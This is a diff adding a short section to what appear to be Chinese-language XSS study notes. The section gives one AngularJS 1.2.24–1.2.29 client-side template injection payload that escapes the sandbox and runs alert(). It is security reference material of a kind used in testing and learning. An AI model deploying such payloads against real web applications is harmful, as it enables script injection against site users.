@@ -23,3 +23,17 @@ ls -lah xss.doc
 
 ![5934BE93A312FA7C13363F1A4C187775](XSS.assets/5934BE93A312FA7C13363F1A4C187775.png)
 
+
+
+## 挖掘XSS技巧
+
+### 组件漏洞
+
+an AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29
+
+Payload:
+
+```
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+```
+
